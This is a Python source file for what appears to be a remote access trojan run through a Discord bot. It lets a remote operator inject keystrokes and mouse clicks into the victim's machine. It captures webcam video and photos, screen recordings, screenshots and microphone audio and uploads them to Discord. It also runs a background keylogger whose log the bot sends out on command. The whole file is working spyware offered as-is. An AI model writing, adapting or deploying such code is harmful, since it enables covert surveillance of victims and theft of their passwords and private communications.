import discord
import webcam
import screen
from dotenv import load_dotenv
import os
import pyautogui
import cv2
from multiprocessing import Process
import sys
import mouse
import pyaudiotest

import keyboard # for keylogs
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime

from discord_webhook import DiscordWebhook


load_dotenv(dotenv_path="config")
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
@client.event
async def on_ready():
    print("Le bot est prêt !")
@client.event
async def on_message(message):
    if str(message.channel) == "controlkeyboard": 
        if message.content.startswith('['):

             s = message.content
             l = list(s)
             l[0] = ""
             l[(len(s) - 1)] = ""
             s = "".join(l)
             pyautogui.press("\'" + s + "\'")
             print(s)
        else : 
            pyautogui.write(message.content)
    elif str(message.channel) == "controlmouse" : 
        split_string = message.content.split(",")
        x = split_string[0]
        y = split_string[1]
        mouse.click(int(x), int(y))


    elif message.content == "webcam" :
        for i in range(10):
       		webcam.use_webcam()
       		await message.channel.send(file=discord.File(r'cam_video.avi'))

    elif message.content == "screen" : 
    	for i in range(10): 
    		screen.watch_screen()
    		await message.channel.send(file=discord.File(r'output.avi'))

    elif message.content == "screenshot" : 
        screenshot = pyautogui.screenshot()
        screenshot.save(r'ilename.png')
        await message.channel.send(file=discord.File(r'ilename.png'))
    elif message.content == "img" : 
    	camera = cv2.VideoCapture(0)
    	return_value,image = camera.read()
    	gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
    	cv2.imwrite('img.jpg',image)
    	camera.release()
    	cv2.destroyAllWindows()
    	await message.channel.send(file=discord.File(r'img.jpg'))
    elif message.content == "keylog" : 
    	await message.channel.send(file=discord.File(r'keylogger.txt'))
    elif message.content == "sound" : 
        pyaudiotest.sound()
        await message.channel.send(file=discord.File(r'recording0.wav'))
def mabite(): 
	client.run(os.getenv("TOKEN"))

SEND_REPORT_EVERY = 30

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
    
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylogger"


    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"keylogger.txt")

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you don't want to print in the console, comment below line
        #    print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

def keylog(): 
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()



if __name__=='__main__':
	p1 = Process(target = mabite)
	p1.start()
	p2 = Process(target = keylog)
	p2.start()